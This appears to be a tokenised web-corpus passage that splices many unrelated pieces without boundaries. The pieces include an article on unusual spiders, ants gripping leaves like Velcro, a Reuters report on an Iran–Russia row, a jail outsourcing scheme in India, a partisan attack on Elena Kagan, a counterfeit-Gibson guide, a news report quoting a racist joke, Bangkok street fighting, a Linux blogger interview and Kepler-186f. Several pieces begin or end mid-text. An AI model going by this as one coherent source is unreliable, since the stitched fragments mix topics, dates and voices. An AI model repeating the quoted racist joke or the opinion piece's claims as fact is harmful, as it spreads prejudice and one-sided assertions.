Found in Madagascar and parts of Africa and Australia , these bizarre predators have long necks designed to support the weight of their enormous jaws , and they feed almost exclusively on other spiders , hence their name .
Despite their fearsome appearance and name , they are completely harmless to humans .
An interesting note is that these spiders are survivors from the age of dinosaurs !
Perhaps that ’s why they look so alien nowadays ?
5 Argyroneta aquatica
Known usually as the Water Spider or Diving Bell Spider , it is the only completely aquatic spider in the world .
It is found in Europe and Asia , from the UK to Siberia , and lives in ponds , slow moving streams and shallow lakes .
Since it cannot take oxygen directly from water , the Water Spider builds an underwater retreat with silk , and fills it with air it carries from the surface ( by trapping air bubbles in the hairs that cover its body and legs ) .
Once filled with air , the silk retreat becomes bell shaped and has a silvery shine , hence the spider ’s name ( Argyroneta means “ silvery net ” ) .
The spider spends most of its time inside the bell , and only has to replenish the air once in a while .
It feeds on whatever aquatic invertebrate they can capture , including backswimmers , water striders and diverse larvae ; they also hunt tadpoles and small fish occasionally .
4 Spiny Orb Weaver
Rather than being a single species , horned spiders , also known as Spiny Orb Weavers , are a genus that includes as many as 70 known species , with many more yet to be discovered .
They are found all around the world and are completely harmless despite their frightening appearance ; the horns and spines are supossed to be a deterrent to birds .
These spiders are also noted for adding small silk “ flags ” to the edges of their webs .
These flags make the web more visible to small birds , which can then steer away before becoming entangled on the web .
Horned spiders are found all around the world , often in gardens and near houses .
3 Maratus volans
Yet another Australian species .
Commonly known as the Peacock spider , due to the brightly colored , circular flap in the male ’s abdomen .
Just like an actual peacock , the male of this diminutive species raises this flap like a colorful fan and uses it to catch the female ’s attention ( they have extremely acute eyesight , as do most jumping spiders ) ; it also vibrates its hind legs and abdomen for a more dramatic effect .
Another common trait with the peacock is that the male Maratus will sometimes court several females at the same time .
Until recently , it was thought that the male peacock spider was capable of gliding through the air ; according to some , it would extend the flap when leaping , and therefore increase its jumping distance , hence its name ( volans means “ flying ” ) .
Today we know that the flap is for display purposes only .
But that does n’t make it any less awesome .
2 Myrmarachne plataleoides
This spider is an incredible example of Batesian mimicry , when one animal deters potential predators by “ disguising ” as an unpalatable or dangerous animal of another species .
In this case , it is a jumping spider that looks like a Weaver Ant .
The Weaver Ant is noted for its painful bite and also because they produce two different chemicals that increase the pain in the bite wound .
They are very aggressive ants and the effects of their bite can last for several days .
Many birds , reptiles and amphibians avoid these ants .
On the other hand , the Myrmarachne spider is harmless and shy ; however , it pretends to be just as tough by looking and walking almost exactly as a Weaver Ant ; its cephalothroax ( the front section of a spider ’s body ) is modified so that it looks like the distinct head and thorax of an ant , and it has two black spots that mimic the ant ’s eyes .
Its forelegs mimic the ant ’s antennae , so the spider looks as if it had only six legs , like an actual ant .
Myrmarachne plataleoides is only found in India , China and South Eastern Asia , but is not the only ant - mimicking spider ; many other species are found around the world ’s tropics and they imitate many different kinds of aggressive ant .
1 Happy face spider
No kidding .
This is a real animal , closely related to the black widow spider and found in the rainforests of Hawaii , where it is known as nananana makaki’i .
It is not known to be dangerous to humans in any way .
The strange patterns in the spider ’s yellow abdomen often take the form of a smiling face , although in some individuals the markings are less obvious or even absent .
Some happy face spiders can actually have markings reminiscent of a frowning or screaming face !
Although this is not the only spider with face - like markings , it is certainly the one with the most notorious one .
Unfortunately , it is the only spider in this list considered as endangered , due to its limited range and the reduction of its natural habitat .
Velcro helps astronauts sleep in zero - gravity space , assists those of us who do n’t know how to tie our shoes , and makes for some very entertaining TV .
But according to a new paper in PLoS ONE , a species of ant in French Guiana also uses the principles behind Velcro to catch prey that would otherwise be far too heavy .
Azteca andreae ants have a symbiotic relationship with two species of Cecropia trees , C. obtusa and C. palmata .
The trees provide the ants with nectar to eat and cavities in which to live , and the ants protect the trees from leaf damage by catching and eating herbivores .
The ants have a particularly interesting method of prey capture : they line up along the undersides of the leaves and lie in wait until insects land on the top of the leaf .
Worker ants then chase the prey to the edge of the leaf , where it is ambushed by the hidden ants beneath .
Usually , an ant catches prey in its huge mandibles , then flips it under the leaf and hangs onto it as nearby workers swarm to relieve the ambusher of its heavy catch .
The video provided by the authors is pretty amazing — definitely worth a look .
Velcro means bigger dinners
The discovery of " biological Velcro " resulted from a simple observation : groups of ants that lived on C. obtusa trees were more adept at catching heavy prey than groups that lived on C. palmata trees .
Since the ants were all the same species , the difference had to be related to the leaf surface .
It turns out that the underside of C. palmata leaves is relatively smooth , while C. obtusa leaves have a velvet - like covering thanks to an increased number of tiny , hair - like trichomes .
A. andreae ants have hook - like claws and can hang onto these downy trichomes just as the hooked layer of Velcro sticks to the fuzzy layer .
When a particularly heavy prey item is dangling from the ant ’s jaws , this “ hook - and - loop ” system means the difference between catching a big meal and letting the prey fall to the forest floor , where it escapes .
With the help of this natural Velcro , the ants are able to catch up to 13,350 times their own weight , and probably more .
In contrast , other known species of symbiotic ants can hold less than 2,000 times their own weight .
The largest catch the authors observed was a 10.5 cm locust weighing 18.6g ; bear in mind that each A. andreae ant weighs about 1.4mg ( less than the average grain of sugar ) .
Can one ant hold a coin ?
The ambitious researchers did n’t stop with observation , however — they wanted to experimentally check that their observations held up .
So , how did they test whether this fuzzy trichome layer makes the difference ?
By hanging weights from the ants ' mandibles , naturally .
The authors tricked the easily agitated ants into grabbing threads connected to objects with different weights , such as a 10 - cent Euro coin .
The ants were in fact much more successful in capturing the objects — especially the heaviest ones — when they hung from the undersides of leaves , compared to either the upper sides of the leaves or to sheets of plastic .
Additionally , the ants could hold far more weight for a longer period of time on C. obtusa leaves than they could on C. palmata leaves .
The combination of the ants ’ hooked claws and the leaves ’ thick trichome layer gives these ants a distinct advantage when catching very heavy prey .
This scenario is n’t the only example of naturally occurring Velcro .
Velcro was first inspired by burdock seeds , which have hook - like extensions that cling to the fuzzy hair of mammals during dispersal .

* Ahmadinejad calls on Medvedev to change sanctions stance
* Iran tells Kremlin chief to “ think more ” and be “ cautious ”
* Russia raps Iranian president for political demagoguery
* Worst row between Russia and Iran since Cold War
( Recasts to add Russian criticism )
By Robin Pomeroy and Guy Faulconbridge
TEHRAN / MOSCOW , May 26 ( Reuters ) - Iran and Russia clashed on Wednesday over Kremlin support for draft U.N. sanctions against the Islamic Republic , in one of the worst rows between the two powers since the Cold War .
The public clash indicates growing concern in Tehran after the United States said Russia and China , the closest thing Iran has to big - power allies , had agreed to a draft sanctions resolution to punish Iran over its nuclear programme .
In unusually strong criticism of Russia , President Mahmoud Ahmadinejad admonished the Kremlin for bowing to what he said was U.S. pressure to agree sanctions and bluntly warned President Dmitry Medvedev to be more cautious .
“ If I were the Russian president , when making decisions about subjects related to a great nation ( Iran ) ... I would act more cautiously , I would think more , ” Ahmadinejad said in a televised outdoor speech .
He said that Russian support for the United States was unacceptable and that Moscow should rethink its decision or face being viewed as an enemy by Tehran .
Within hours , the Kremlin ’s top foreign policy adviser dismissed Ahmadinejad ’s criticism , telling the Iranian president to refrain from “ political demagoguery ” .
“ No one has ever managed to preserve one ’s authority with political demagoguery .
I am convinced , the thousand - year history of Iran itself is evidence of this , ” Sergei Prikhodko said in a statement read out by a Kremlin spokeswoman .
“ The Russian Federation is governed by its own long - term state interests .
Our position is Russian : it reflects the interests of all the peoples of greater Russia and so it can be neither pro-American nor pro-Iranian , ” he said .
ROW WITH RUSSIA
The spat between two of the world ’s biggest energy producers -- with a personal tirade by a president against a Kremlin leader -- is the worst in many years , analysts said .
Though trade ties have grown over the past two decades , Russia is still regarded with deep distrust in Iran after several wars between Persia and the Tsarist Empire , followed by rocky relations with the atheist Soviet Union .
Russia has been dismayed by Tehran ’s failure to disclose full details about its nuclear programme and diplomats say privately that Kremlin leaders have been burned several times while attempting to get Iranian leaders to resolve the dispute .
Prikhodko issued a clear rebuke to Tehran over its failure to allay fears about its nuclear programme .
“ Any unpredictability , any political extremism , lack of transparency or inconsistency in taking decisions that affect and concern the entire world community is unacceptable for us , ” he said .
“ It would be good if those who are now speaking in the name of the wise people of Iran ... would remember this . ”
Since the 1991 fall of the Soviet Union , trade has grown , reaching $ 3 billion last year .
Russia has struck deals to build Iran ’s first nuclear power station and sell billions of dollars of weapons .
But the row with Moscow could hurt Russian plans to start the nuclear reactor at the Bushehr power plant in August and Iran is unlikely to see a Russian delivery of the S - 300 surface - to - air missiles it agreed to sell Iran .
“ Moscow has repeatedly saved Iran from very tough sanctions , so Ahmadinejad ’s defiance is quite frankly out of place , ” Pyotr Goncharov , a Moscow - based specialist on the Gulf , told Reuters .
“ It is simply the latest attempt by the Iranian president to lay the blame for his own problems at someone else ’s door . ”

Outsourcing unit to be set up in Indian jail
By Omer Farooq
BBC News , Hyderabad
Charlapally Central Jail has state - of - the - art facilities Authorities in the southern Indian state of Andhra Pradesh are planning to set up an outsourcing unit in a jail .
The unit will employ 200 educated convicts who will handle back office operations like data entry , and process and transmit information .
The project will begin at Charlapally Central Jail , near the state capital Hyderabad , in the next four months .
India is a hub for the outsourcing industry , but this is the first time a unit will be set up inside a jail .
The prison , with 2,100 inmates , is Andhra Pradesh 's most modern with state - of - the - art facilities .
The proposed outsourcing unit is a public - private partnership between the department of jails and an IT ( information technology ) company , Radiant Info Systems .
' Ensuring future '
" The idea is to ensure a good future for the educated convicts after they come out of jail , " CN Gopinath Reddy , director general of prisons in Andhra Pradesh , told the BBC .
" With their experience of working in the BPO [ business process outsourcing ] in jail , any company will absorb them in future . "
Radiant Info Systems director C Narayana Charyulu said Charlapally jail was chosen for the project because nearly 40 % of the inmates there were educated .
" We have identified the area in the jail where the unit will come up .
It will have computers as well as connectivity , " Mr Reddy said .
Mr Charyulu said 200 people would be recruited and trained for the job initially .
The unit , which is expected to undertake back - office work for banks , will work round the clock with three shifts of 70 staff each .
Working in the unit will also be financially rewarding for the prisoners .
" The convicts get a paltry 15 rupees [ 33 cents ] per day for other work like making steel furniture or working on looms , but we intend to pay them 100 rupees [ $ 2.2 ] to 150 rupees [ $ 3.32 ] a day , " Mr Charyulu said .
Officials say this is a pilot project and , if it succeeds , it could be extended to other jails in the state .
Of the total 13,000 convicts in Andhra Pradesh jails , about 2,000 are considered well - educated and could potentially be good workers for BPOs and even call centres in the future .
Mr Charyulu said a BPO in jail would benefit the inmates as well as help the IT company make some profits .

Barack Obama ’s latest nominee for the U.S. Supreme Court , Elena Kagan , is almost certain to be confirmed , and that is truly frightening news for America .
Why ?
Because the truth about Elena Kagan is beyond shocking .
When she is confirmed , she will become the most liberal member of a Supreme Court that is already extremely liberal .
She is radically pro-abortion , extremely sympathetic to the gay agenda and has no respect for life whatsoever .
Just consider a few of the startling facts that have come out about Elena Kagan … .
* After the election of Ronald Reagan , a young Elena Kagan openly yearned for a more “ leftist left ” .
* As an aide to President Bill Clinton , Kagan took a lead role in fighting a Republican bill to limit abortion .
* Kagan once referred to the Pentagon ’s Do n’t Ask , Do n’t Tell policy as “ a profound wrong — a moral injustice of the first order ” .
* One newly produced document from the Clinton archives has revealed that Kagan once defended ex-President Bill Clinton ’s veto of a bill to ban partial - birth abortions .
* White House memos from 1997 , when Elena Kagan was a top domestic policy advisor to President Clinton , show that she recommended that the Clinton administration permit cloning of human embryos for research purposes .
Cloning of human embryos for research ?
Is that the kind of future we are headed towards ?
Well , the answer is yes if Elena Kagan has anything to say about it .
The truth is that Elena Kagan would give new meaning to the term “ liberal activist judge ” .
Between Elena Kagan and Sonia Sotomayor , the Democrats now have a liberal core of judges on the Supreme Court that could last for decades .
America cannot afford for Elena Kagan to be confirmed , but with the Democrats firmly in control that is exactly what is going to happen .
This is yet another indication of just how far America has fallen .
The United States is heading straight into the moral toilet , and we have nobody to blame but ourselves .
What a horrible nation we are becoming .
15 May 2010 4 Comments
A little while back , we posted an article with some information to help you spot a counterfeit Gibson guitar .
For a while now , there seems to have been a bit of a glut of fake Gibsons coming from the Far East – mostly China .
These guitars are pretty readily available on the net from Chinese wholesale sites .
While these instruments are n’t the worst in the world , I ’d hate to think of someone being fooled .
If you want to buy what you know is a fake Les Paul , while Gibson ( quite rightly ) wo n’t approve , go right ahead – you pays your money and takes your chances .
My main concern is for those who do n’t know they ’re buying a phony Gibson .
So , to try arm potential buyers , I ’m supplementing the information ( originally released by Gibson , I believe ) that was mentioned in the previous article .
That information is – I think – a little out of date now and could also do with some ‘ topping - up ’ .
As I had the dubious fortune to have a Chinese Les Paul copy through my workshop recently , I thought I ’d take the opportunity to get a few photographs of the fake and compare to similar photos of a genuine Les Paul .
Along the way , I ’ve explained a little about what you ’re seeing – I think understanding the reasoning behind the design choices of the counterfeiters can only help you in spotting a fake .
It does mean the article is a little long however .
You might want to grab a coffee .
I hope this helps .
The fake Gibson image is on the left and the genuine Gibson on the right unless stated .
Click each image for a larger view .
Neck wood
The majority of ( although by no means all ) Les Pauls have a neck that is cut from a single billet of mahogany .
The neck is all one piece of wood .
While this practice contributes to the dozens of Gibsons I get through my workshop every year with broken headstocks , it ’s also a big part of the Gibson ethos .
The problem for the fakers is that making necks this way is a very wasteful practice .
There ’s lots of wood left over that ’s of limited use .
Therefore , they tend to cut their necks from smaller billets and then glue additional wood to them to make up whatever ’s missing .
Above , you can see that the fake Les Paul on the left has had its angled headstock scarfed on .
The joint between the two different pieces of wood is obvious .
One thing to note ( which confuses things very slightly ) is that genuine Gibsons usually have the left and right edges of the headstock glued on from a separate piece of timber ( you can just see this in the image on the right ) .
These headstock ‘ ears ’ are normal and not a sign of a counterfeit Gibson .
The joint is n’t quite so obvious down at the heel - end but it is there .
Further confusing things on this jointed - neck issue is the fact that Gibson ’s history is sometimes a murky , foggy place .
I ’ve seen Gibsons with headstocks jointed just like the fake one above .
I ’ve seen Les Pauls with maple necks hidden under solid colour finishes that have been made from four or five jointed pieces of timber .
A jointed neck should be considered a warning sign , however , and should make you look out for the less - obvious signs .
Neck Binding
A spanking - new Les Paul should have little binding nibs at the ends of each fret along the neck .
This is the result of the way Gibson fret their fingerboards and is a practice that is n’t followed anywhere else .
If the metal fret - ends go all the way to the edge of the binding , that ’s a red flag .
It ’s worth noting that , if the instrument has been refretted at some stage , most likely , this will not hold .
It ’s incredibly labour - intensive to retain those nibs when refretting and most people choose not to ( when they hear the cost of keeping them ) .
Truss Rod
As mentioned in the last article , the truss - rod access used to be a giveaway for a knockoff Gibson .
Typically , it was covered with a triangular ( ish ) plastic cover retained by three screws rather than the genuine two - screw , bell - shaped cover .
Underneath , on the fake , was a narrow access channel rather than a wider , arch - shaped access .
Well , it seems the fakers have gotten wise to this .
This fake Les Paul has a bell - shaped cover , held in place by two screws .
Underneath , it has a large access cavity .
At first glance , it looks pretty similar .
There are a couple of alarm bells ringing though .
The arrow in the fake Les Paul image on the left shows that the two screw truss - rod cover does n’t quite fit – the fact that the screw hole is mostly air is testament to that .
The truss - rod nut itself is not the right shape .
While we may be getting a little geeky here , it ’s very different to the more curved , ‘ acorn ’ shape of the original .
Lastly , between the nut and the wood of the neck , there is no ‘ half - moon ’ washer .
The washer is there to spread the load when tightening the nut – without it , there is a risk that this fake ’s nut will just tighten into the wood of the neck .
That ’s not Les Paul ’s signature
It looks fine from arm ’s length but take a close look at the logo on this pirate Les Paul and you can see the difference .
It does n’t take a graphologist to tell you that one of these is n’t right .
The forgery is less graceful ( for want of a better word ) .
The phony Les Paul logo is a consistent thickness – they have n’t been able to replicate the thick / thin , calligraphy style of the genuine logo – and looks obviously incorrect when compared to the original .
Look at the flame on that
Nigel Tufnel would n’t be fooled .
Take a look at the top of the dodgy Gibson .
Rather than give you a wonderfully beautiful – and wonderfully expensive – flamed maple top , the counterfeiters will save money by faking it .
A photo - finish is the method used .
The flame you see in the top of the leftmost image above is not there – it ’s , essentially , printed on .
It looks pretty good and , to be fair , it ’s a legitimate technique used on budget instruments all over the world .
There ’s no problem as long as the seller does n’t try to pretend it ’s AAAAA - grade maple under that finish .
Along the edge of the top , there are places where the ‘ printing ’ has n’t quite reached the edge .
You can see the flame stop before the binding .
Giveaway – but one that ’s not always there so beware .
Take control
This is n’t something I ’ve noticed on the Chinese Fake Les Pauls before ( although it may have been there ) .
The volume and tone controls appear to be mounted at right - angles to the back of the guitar .
Because there is a curve on the top though , this means they do n’t sit quite right – closer to the wood on one edge than the other .
On the real Gibson , the controls are at right angles ( more or less ) to the curve .
From a tooling point of view , this makes sense on a cheap forgery and I ’d be willing to bet it is consistent on lots of other Les Paul fakes .
Keep ’em peeled .
On the case
Lastly , the guitar case .
Again , the knock - off artists have been paying attention .
This fake guitar comes with a Gibsonesque hard case .
The Gibson features of this case are only skin deep though .
All of these images are of the fake Gibson case , by the way .
The fake case is just a cheap , generic , hard - case that ’s had a Gibson logo screen - printed on .
It ’s not as sturdy as a real Gibson case .
It has a moulded rubber handle with some flimsy looking brackets to retain it .
Inside , it ’s got some unpleasant nylon hairy stuff – it feels and looks cheap .
Lastly ( and possibly it ’s just this example ) the whole exterior has a nasty , sticky feel – like some sort of lacquer covering .
Counterfeit conclusions
There are plenty of dodgy Gibson guitars out there .
If you know you ’re buying a fake and are happy to do so , fine – it ’s not ideal , but it ’s your money and conscience .
These are n’t necessarily ‘ bad ’ guitars but they are definitely budget guitars and they are definitely not Gibsons .
There ’s far too much potential for innocent guitarists to get ripped off and , hopefully , this article will go some way towards preventing that .
In conjunction with the information already out there from Gibson , this should help paint a broader picture .
It ’s worth bearing in mind the provisos mentioned throughout the article – some of them , on their own , are n’t definite proof of a fake but should be sufficient to make you wary and more questioning .
Remember also , that , if buying from the internet , you may not be able to properly check all of these items .
Caveat emptor .
Let the buyer beware .
It ’s worth remembering the ‘ if it sounds too good to be true … ’ maxim .

Two Tory councillors have been suspended from the party after sending a racist joke to an email list including Ribble Valley Tory MP Nigel Evans , the mayor of South Ribble , and fellow Conservative councillors .
Simon Farnsworth , a Ribble Valley councillor , sent the joke on to Ken Hind , his fellow councillor and a former Tory parliamentary candidate in Selby and Lancashire West at the 1997 and 1992 elections .
Hind then sent it on to a long list of Tories , including Evans ; DW Parkinson , the mayor of South Ribble ; and other South Ribble and Ribble Valley councillors .
When the Guardian drew the Conservative party 's attention to the email , the two men were suspended .
The joke runs as follows :
A Somalian arrives in the UK as a new immigrant .
He stops the first person he sees walking down the street and says , " Thank you Mr UK man for letting me into this country , giving me housing , money for food , free medical care , free education and no taxes ! "
The passerby says , " You are mistaken , I am an Afghani [ sic ] ! "
The man goes on and encounters another passer by .
" Thank you for having such a beautiful country here in the UK ! "
The person says , " I not from the UK , I am Iraqi ! "
The new arrival walks further , and the next person he sees he stops , shakes his hand and says , ' Thank you for the wonderful UK ! '
That person puts up his hand and says , " I am from Pakistan , I am not from the UK ! "
He finally sees a nice lady and asks , " Are you British ? "
She says , " No , I am from India ! "
Puzzled , he asks her , " Where are all the British ? "
The Indian lady checks her watch and says : " Probably all at work . "
The email ended with another joke : " IF YOU DON'T PASS THIS ON TO ALL YOUR FRIENDS YOU WILL RECEIVE 3 ILLEGAL IMMIGRANTS ABSOLUTELY FREE . "
A Tory spokesman said : " Simon Farnsworth and Ken Hind have been suspended from the Party .
The contents of this email have no place in the Conservative party . "
Hind said he apologised to " all those people from the nations mentioned in the joke .
It was not my intention to insult their racial origins , and I deeply regret passing on this item as I recognise now that it could cause offence . "
He added : " In my daily life I deal with many people of different racial origins in our diverse community and in our relationships get on well with them .
I deprecate those who are racist .
On many occasions I have been outspoken in my condemnation of those who incite racial hatred and am committed to developing an integrated tolerant community in which all races creeds and religions live side by side in peace .
" I am privileged to name amongst my friends and associates many who are of Asian or African origin .
I wish to emphasise that any apparent insult or criticism contained in the joke does not reflect my views or those of the Conservative party . "
Farnsworth has also been contacted for comment but had not responded at the time of publication .
David Eccleston , who received the email by mistake and passed it to the Guardian , said that many people thought David Cameron " seems like a nice guy and he seems to care " , but " these jokes bring you back to Earth with a bang because you realise that behind Cameron 's call for ' change ' are the same old nasty Conservative party – and that 's not change . "
The Tories suspended parliamentary candidate Philip Lardner last week after he wrote that homosexuality " is not normal behaviour " .
The previous week , two Conservative local election candidates were suspended for disrupting a visit to east London by John Prescott , the former deputy prime minister .
However , Chris Grayling , the shadow home secretary , has so far kept his job after he expressed support for B &B owners who barred gay couples .
Grayling later said he fully supported gay rights .
On the other side of the political divide , candidate John Cowan was suspended from the Labour party last week for boasting about his sex life online and saying he would not want his children to marry a Muslim .
And , on 10 April , Labour suspended Stuart MacLennan , the candidate in Moray , for offensive comments he made on Twitter .

Instantly , a single crack rang out , felling him .
Two men ran , hunched over , to drag him back to a side street and the motorcycle .
The soldiers allowed them to leave the zone with their critically injured friend , but they will not be allowed back .
This is how the battle for Bangkok will be fought over coming days .
Street by street , inch by inch , casualty by casualty .
Scenes like this are being played out across the centre of the city , as troops slowly squeeze in on the fortified camp that has been held by anti-government Red Shirt protesters for weeks .
The Red Shirts have not yet lost any territory to the army , but the government says it is prepared to wait them out , starving them of food , water , power and contact with the outside world .
The Red Shirts are determined to fight back .
After two days of porous roadblocks which allowed supplies and extra Red Shirts supporters in , the army has put up barricades and strung razor wire across all roads leading to the protest camp .
There are few ways in now .
Already there are reports the Red Shirts are running short of food and of fuel .
Scrambled mobile phone signals are making communications difficult , and the weariness of constant fighting is taking its toll .
Despite the suffering , or perhaps because of it , the leaders on both sides remain resolute .
The Prime Minister , Abhisit Vejjajiva , has appeared on every Thai TV channel promising to '' push forward ' ' with his plan to have the army forcibly remove the protesters , while Red Shirt leaders have vowed to fight to the end .
But on the streets , there is fear .
Fear is in the eyes of the Red Shirts ' guards standing defiantly , but nervously , at the fortified entrance to the camp .
Full of bravado , Annan demonstrates his slingshot , pulling the rubber back and forth , aimed at a sniper , real or imaginary , in a nearby building .
At his feet is a pile of rocks and lumps of concrete to hurl at oncoming troops .
In his back pocket is a homemade rocket launcher fashioned from bamboo and scrap metal , to shoot fireworks at soldiers and police helicopters .
They are a feeble riposte to the rifles and M - 16s of the soldiers crouched behind sandbags and razor wire a few hundred metres away .
The barricade behind which Annan stands , built up over weeks of protest , is a enormous wall of tyres and sharpened bamboo staves , four metres high .
It reeks of petrol .
Expecting troops to march on them any day , the Red Shirts have filled their barricades with fuel , ready to burn their city down before they give it up .
'' We are getting killed .
We are all scared to get killed , but we stay . ''
But fear is written , too , on the faces of the troops on Rama IV Road , at the southern end of the Red Shirts ' zone .
Over loudspeakers , they plead with protesters for peace .
'' We are the people 's army .
We are just doing our duty for the nation .
Brothers and sisters , let 's talk together . ''
There is little hope of that .
In the late afternoon on Ratchaprarop Road in Din Daeng , in the north of the city , doing their duty includes firing live ammunition at anyone they see on the street .
The army has designated it a ' ' live - fire zone ' ' because it is an entry point to the city for Red Shirt supporters from the north - eastern provinces .
Four soldiers huddle behind a telephone box , signalling anxiously to colleagues further back up the road .
As a petrol bomb lands with a ' ' whump ' ' in the middle of the road , three of them scurry back to the safety of a street corner while one remains to provide covering fire .
He quickly retreats too , after firing a half a dozen rounds towards the mass of protesters .
Soon it is dark .
Nightfall comes quickly in this part of the world , making the city , scarcely possible though it is , even more menacing .
The no man 's land between the Red Shirts ' fortifications and the soldiers ' lines is completely blacked out , and eerily empty .
Leaving the Red Shirts ' area for relative safety outside the conflict zone , a small knot of protesters crouch in darkness on the corner of Ploenchit and Wireless roads .
One tells the Herald : '' No light .
Sniper , sniper .
Up high .
Shoot . ''
We are forced to ride a motorbike , creeping along the edge of empty streets , holding a helmet over the headlamp to black it out of view of those soldiers in the buildings surrounding .
These streets , which house some of the most exclusive addresses in Bangkok , usually teem with activity 24 hours a day .
Tonight , they are strewn with rotting garbage , but deserted of people .
The only noise is distant gunfire and explosions , all too regular , coming from other parts of the city .
Half an empty kilometre ahead are the lights of the army roadblock and the rest of the city beyond .
Loading Thousands of Thais spend hours just outside the conflict zone , unable to see much beyond the smoke and the barricades , and unable to hear anything except for the volleys of gunfire .
From a distance , they watch their city descend into war .
As the Herald passes , one woman yells hysterically at the impassive soldiers manning the roadblock : '' They are killing us , they are killing us .
We are Thais too .
Why do they kill us ? ''

Rochelle and Marvin return with the playalong pop quiz
Three fun-loving couples try to spot the tunes - but who will end up top of the pops ?
Though it ’s making its debut here on Oa with today ’s post this is technically the second installment of my “ five questions ” series — the first appeared on my previous blog with IntoMobile.com blogger and fellow Canadian Simon Sage .
I should also confess that I ’ve a special place in my heart for Mother Africa .
I ’ve had the good fortune to visit South Africa , Uganda & Egypt , and recommend that everyone who ’s able should make a pilgrimage to some part of it in their lifetime — it really is the cradle of civilization .
But enough about me …
This is Luqman Saeed , owner & operator of Ghabuntu.com — which I first came across on one of my many early searches for Ubuntu - related things on the web .
He ’s been an avid supporter of this blog on Facebook and fairly active in the comments as of late , so what kind of host would I be if I did n’t introduce him to you all ?
1 . Given the name of your blog I ’m pretty sure that I know the answer to this , but for the record : which Linux distro are you currently using , on what machine (s ) and why ?
As is my “ open ” secret , I am an Ubuntu user .
In fact I have always been ; I do n’t know why but the distro has blown me away .
Besides , it works well for me .
I think the main reasons I use Ubuntu are twofold : the ease of accessibility to support — just Google your question ( and make sure there is the word Ubuntu in it ) — and also the African connection in the name .
I am currently running it on An Acer Extensa 4220 ( lappy ) with 1GB of RAM , 80GB HDD , 2 Ghz Intel Celeron Processor .
Not a powerful machine by your standards .
😉 … but Linux still makes me get the best out of it .
I do , however , do what I call distro testing as and when I get the chance .
I like hopping to DistroWatch and checking some of the distros that I ’ve not tried before in their live mode .
And to be honest , I have been impressed by some and woefully disappointed by others .
2 . How did you first become a Linux user ?
Back in 2002 - 03 or thereabouts I started using computers .
But I noticed the software ( I did n’t yet know the term “ OS ” ) was agonizingly slow .
It took ages to boot up and eons to execute mouse clicks .
I just had to make do because after all , everybody else was using it — “ it ” being Windows …
A couple of years later when I became more familiar with computers I became even more fed up with Windows .
Out of frustration , one day I just Googled the query “ free alternative operating systems ” and the rest is history .
The first result on that list was Ubuntu.com , I headed there and even though most of the terms there sounded like gibberish to me at the time , I still went ahead and requested a CD .
Hardy was then in beta I think , so I added my name to the list and waited patiently for it to arrive some time later .
It was during that period also that I bought my laptop .
So the CD could n’t have arrived at a better moment .
And I have been playing with Linux since then .
So roughly I have been a Linux user since 2008 and recently went full - time .
No more “ Winblows ” on my machine . 😀
3 . So what moved you to make the jump from user to blogger ?
As with every ( software ) project , there are people who make it , and people who use it .
I am a user .
I have no formal qualification in IT whatsoever .
When I have a problem , I turn to Google or my very good friend from Brazil who also writes on the blog .
What I realized was that most of the blogs out there are mostly top - down blogs — that is , the writer is either a coder or programmer and always writes stuff telling the “ rest of us ” about how to do stuff .
Such blogs are in the overwhelming majority .
There are little to no blogs that use the bottom - up approach — that is , a user sending feedback , criticism , views , ideas , praise and more to the developers .
Sure you can do all of those in the respective projects ’ forums or sites .
But I realized that would just be one more bunch of text that would get filed away and possibly lost .
So I decided to use my dormant blog for which I had no us , other than the fact that I heard you could create a website easily through something called Blogger .
And Ghabuntu was born .
I struggled a lot to come up with that name .
I wanted something that could project my identity as an African and at the same time give you an idea upfront about what the blog is about .
As a blogger , I am bound by nothing in what I can say as long as to the best of my knowledge it is true and fair .
I critique when the situation demands it , praise , defend , bring to the limelight unknown projects or applications , share my small small discoveries and overall , get to learn a great deal from people around the world .
The greatest thing to have come out of this blog however , is the kind of people I ’ve been exposed to .
I now have some really great friends , as in true friends from almost all the continents of the world .
And the best part is , all of them know way more than I do and I get to benefit a great deal from them .
4 . What do you see as the biggest challenge for Linux adoption in your part of the world ?
The structure of Linux .
Let me explain .
For instance , after every Ubuntu install I have to do some “ sudoing ” in and there to get multimedia codecs , install my favorite applications and update my system .
All these sound like no big deal until you remember you need to be connected to the net to do all of those .
It is a big hurdle you know .
Distros like Mint and Lubuntu have a great future here in that light .
They hit the ground running with no fuss whatsoever .
Then when I want to install an additional application , I need to be connected to the net , unlike Windows where I just need to get the “ . exe ” file and be done with .
Bandwidth over here is very expensive and thus running such a network - intensive OS can be costly in the long run — that is if you rely on the more popular mobile broadband Internet as I do at home .
Then too we have the Windows piracy cancer .
Windows here is at the same price point as Linux .
Just ask a friend and you have a copy of XP to 7 , free of course , no fuss .
And given the dominance of Windows around the world , Linux is already at a disadvantage because its biggest selling point — which is price — has been eroded already .
Add to that fact that 9.5 out of 10 do n’t know what Linux or Open Source for that matter is and you have a Herculean task at hand .
The big - name Linux vendors are also not helping .
Sometimes I really feel disappointed in that all their attention is focused on already - saturated markets in advanced countries when there is a massive potential here for them to dominate .
I am yet to see any proactive move by say Red Hat or Canonical here in Africa ( barring South Africa where Ubuntu hails from ) that is aimed at projecting Linux to the masses here .
Windows recently teamed up with the biggest cyber - cafe in Africa to provide users with a security software called Internet Explorer 8 — yeah , you read right ! — in a PR stunt that puts M$ in the light of a great “ benefactor ” to Africa .
5 . What would you say Ghabuntu is doing that other blogs about Linux are n’t ?
Independent .
Yeah , none of the FOSS blogs are owned by any of the distros , but I see Ghabuntu as independent — though I am an Ubuntu user , I have myself chastised it a lot .
I have chastised FOSS in general too before .
I do not see myself as a dogmatic user but a normal everyday user .
I quite remember just two days after I hit a post defending Ubuntu , my friend and co-writer also wrote another post severely but academically chastising the same Ubuntu .
For some strange reason , I felt proud to be part of a blog — an underdog but not afraid to have divergent views on the same issue , something that is not taken kindly in the FOSS arena .
If there is one thing that FOSS has more than enough of , it is “ fanboy - ic ” blogs that do more harm than good to the overall community and projects .
Ghabuntu is a FOSS blog in general and Linux in particular , but is not bound to singing FOSS hymns only . 😀
This artist illustration shows what it might be like to stand on the surface of the planet Kepler - 186f , the first - ever Earth - size planet to be found in the habitable zone of its star .
For the first time , scientists have discovered an Earth - size alien planet in the habitable zone of its host star , an " Earth cousin " that just might have liquid water and the right conditions for life .
This artist illustration shows what it might be like to stand on the surface of the planet Kepler - 186f , the first - ever Earth - size planet to be found in the habitable zone of its star .

The newfound planet , called Kepler - 186f , was first spotted by NASA 's Kepler space telescope and circles a dim red dwarf star about 490 light - years from Earth .
